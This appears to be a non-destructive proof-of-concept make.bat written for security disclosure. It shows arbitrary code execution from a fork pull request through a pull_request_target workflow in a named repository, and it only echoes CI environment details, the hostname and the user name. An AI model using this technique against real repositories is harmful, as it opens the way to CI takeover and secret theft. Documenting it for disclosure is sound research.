@echo off
REM PoC make.bat -- Security Research (Non-Destructive)
REM This demonstrates arbitrary code execution via pull_request_target
REM No secrets are exfiltrated. No systems are modified.

if "%~1"=="" goto check
if /I "%~1"=="check" goto check
if /I "%~1"=="format" goto format
if /I "%~1"=="test" goto test
if /I "%~1"=="venv" goto venv
goto check

:venv
echo === PoC: venv target executed ===
goto end

:check
echo ============================================
echo === SECURITY PoC: ARBITRARY CODE EXECUTION ===
echo ============================================
echo.
echo --- Environment Information ---
echo GITHUB_WORKFLOW=%GITHUB_WORKFLOW%
echo GITHUB_EVENT_NAME=%GITHUB_EVENT_NAME%
echo GITHUB_ACTOR=%GITHUB_ACTOR%
echo GITHUB_TRIGGERING_ACTOR=%GITHUB_TRIGGERING_ACTOR%
echo GITHUB_REPOSITORY=%GITHUB_REPOSITORY%
echo GITHUB_REF=%GITHUB_REF%
echo GITHUB_SHA=%GITHUB_SHA%
echo RUNNER_OS=%RUNNER_OS%
echo.
echo --- Proving Code Execution ---
echo Hostname: %COMPUTERNAME%
echo Whoami: %USERNAME%
echo PWD: %CD%
echo Date: %DATE% %TIME%
echo.
echo --- PoC Summary ---
echo This make.bat was provided by a fork PR and executed
echo in the context of the base repository (microsoft/typeagent-py).
echo The permissions-check job is COMMENTED OUT, providing zero gating.
echo ============================================
echo === END SECURITY PoC ===
echo ============================================
goto end

:format
echo === PoC: format target executed (code execution confirmed) ===
goto end

:test
echo === PoC: test target executed (code execution confirmed) ===
goto end

:end
